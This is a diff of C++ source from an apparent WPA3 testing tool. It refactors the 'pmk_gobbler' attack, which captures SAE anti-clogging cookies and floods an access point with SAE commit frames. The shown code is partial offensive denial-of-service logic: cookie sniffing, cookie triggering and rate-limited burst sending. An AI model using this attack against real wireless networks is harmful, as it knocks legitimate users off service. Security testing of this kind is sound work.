@@ -20,14 +20,14 @@ using namespace Tins;
 using namespace chrono;
 
 namespace wpa3_tester::pmk_gobbler {
-optional<ACMCookie> parse_acm_response(const vector<uint8_t> &packet) {
-	const auto sae = sae_helper::parse_sae_commit(packet);
+optional<ACMCookie> parse_acm_response(const frame_raw_t &frame) {
+	const auto sae = sae_helper::parse_sae_commit(frame);
 	if(!sae || sae->token.empty()) return nullopt;
 
-	const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet.data() + 2);
-	if(packet.size() < static_cast<size_t>(radiotap_len + 10)) return nullopt;
+	const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(frame.data() + 2);
+	if(frame.size() < static_cast<size_t>(radiotap_len + 10)) return nullopt;
 
-	return ACMCookie{ .sta_mac = HWAddress<6>(packet.data() + radiotap_len + 4), .token = sae->token };
+	return ACMCookie{ .sta_mac = HWAddress<6>(frame.data() + radiotap_len + 4), .token = sae->token };
 }
 
 void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store) {
@@ -44,10 +44,10 @@ void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, Cook
 	pcap_freecode(&fp);
 
 	components::poll_sniffer<monostate>(
-			handle, nullopt, [&](const uint8_t *packet, const uint32_t caplen) -> optional<monostate> {
+			handle, nullopt, [&](const frame_raw_t &frame) -> optional<monostate> {
 				if(store.stop.load()) return monostate{};
 
-				if(auto entry = parse_acm_response({ packet, packet + caplen })) {
+				if(auto entry = parse_acm_response(frame)) {
 					scoped_lock lock(store.mtx);
 					const auto [it, inserted] = store.queue.insert_or_assign(entry->sta_mac, *entry);
 					if(inserted)
@@ -79,8 +79,8 @@ pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, con
 
 		auto result = components::poll_sniffer<ACMCookie>(sniffer.get_pcap_handle(),
 				milliseconds(acm_pause_millisec),
-				[&](const uint8_t *packet, const uint32_t caplen) -> optional<ACMCookie> {
-					if(auto cookie = parse_acm_response({ packet, packet + caplen })) {
+				[&](const frame_raw_t &frame) -> optional<ACMCookie> {
+					if(auto cookie = parse_acm_response(frame)) {
 						if(!cookie->token.empty()) return cookie;
 					}
 					return nullopt;
@@ -96,11 +96,11 @@ pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, con
 
 void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac, CookieStore &store,
 		const int attack_time_sec, const sae_helper::SAEPair &sae_params, const size_t burst_size,
-		const size_t packets_per_second_limit, const int cookie_wait_ms) {
+		const size_t frames_per_second_limit, const int cookie_wait_ms) {
 	PacketSender sender(iface);
 	log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
 	dos_helpers::timed_burst(
-			sender, attack_time_sec, burst_size, packets_per_second_limit, [&]() -> optional<RadioTap> {
+			sender, attack_time_sec, burst_size, frames_per_second_limit, [&]() -> optional<RadioTap> {
 				optional<ACMCookie> entry;
 				{
 					scoped_lock lock(store.mtx);
@@ -134,7 +134,7 @@ void run_attack(RunStatus &rs) {
 	const int trigger_count = att_cfg.at("acm_trigger_count").get<int>();
 	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
 	const size_t burst_size = att_cfg.at("burst_size").get<size_t>();
-	const size_t packets_per_sec = att_cfg.at("packets_per_second_limit").get<size_t>();
+	const size_t frames_per_sec = att_cfg.at("frames_per_second_limit").get<size_t>();
 	const int cookie_wait_ms = att_cfg.at("cookie_wait_ms").get<int>();
 
 	//TODO chcek if ap has ssid (was hardcoded before)
@@ -168,7 +168,7 @@ void run_attack(RunStatus &rs) {
 				attack_time,
 				sae_params.value(),
 				burst_size,
-				packets_per_sec,
+				frames_per_sec,
 				cookie_wait_ms);
 	} catch(...) {
 		store.stop.store(true);
